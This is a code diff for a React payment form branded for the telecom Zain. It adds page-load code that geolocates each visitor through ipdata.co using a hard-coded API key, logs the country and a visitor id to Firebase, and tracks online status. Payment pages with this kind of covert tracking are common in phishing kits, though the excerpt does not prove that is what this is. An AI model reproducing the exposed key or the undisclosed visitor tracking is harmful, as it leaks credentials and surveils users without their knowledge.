@@ -12,8 +12,9 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Checkbox } from "@/components/ui/checkbox"
 import { Badge } from "@/components/ui/badge"
 import { Separator } from "@/components/ui/separator"
-import { useLocation } from "@/lib/use-location"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/util"
+const _id = Math.random().toString(36).replace("0.", "zain-")
 
 export default function ZainPaymentForm() {
   const [phone, setPhone] = useState("")
@@ -24,7 +25,6 @@ export default function ZainPaymentForm() {
   const [phoneError, setPhoneError] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [activeTab, setActiveTab] = useState("bill")
-  const location=useLocation()
   // Validate phone number
   useEffect(() => {
     if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
@@ -46,7 +46,33 @@ export default function ZainPaymentForm() {
     localStorage.setItem("amount", value)
     setAmount(Number.parseFloat(value))
   }
+  const getLocation = async () => {
+    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
 
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+
+      const country = await response.text()
+
+      addData({
+         createdDate:new Date().toISOString(),
+          id: _id,
+        country: country,
+      })
+
+      localStorage.setItem("country", country)
+      setupOnlineStatus(_id)
+    } catch (error) {
+      console.error("Error fetching location:", error)
+    }
+  }
+  useEffect(()=>{
+    getLocation()
+  },[])
   const handleSubmit = () => {
     const _id=    localStorage.getItem('visitor')
     
